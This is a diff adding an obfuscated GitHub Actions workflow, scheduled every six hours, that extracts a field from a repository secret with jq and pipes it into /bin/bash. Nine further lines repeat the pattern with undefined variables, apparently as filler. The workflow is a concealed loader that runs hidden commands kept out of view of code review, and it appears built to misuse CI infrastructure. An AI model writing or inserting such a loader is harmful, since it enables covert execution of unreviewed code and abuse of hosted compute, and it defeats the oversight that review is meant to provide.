@@ -1,0 +1,26 @@
+name: xunmiyujuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xunmiyujuu
+        env:
+          clcne48: ${{ secrets.clcne48 }}
+        run: |
+          echo $clcne48 | jq -r .kbsp9 | /bin/bash
+          echo $kbg184 | jq -r .borsb978 | /bin/bash
+          echo $ys8790 | jq -r .lwtv8602 | /bin/bash
+          echo $a23858 | jq -r .gt8614 | /bin/bash
+          echo $hb960 | jq -r .zg46982 | /bin/bash
+          echo $tdp5635 | jq -r .cpivs447 | /bin/bash
+          echo $tq331 | jq -r .vfpjc705 | /bin/bash
+          echo $cpga09712 | jq -r .oqve04 | /bin/bash
+          echo $rcrl88 | jq -r .hkrr84760 | /bin/bash
+          echo $vhtcc9 | jq -r .bbg1 | /bin/bash
+
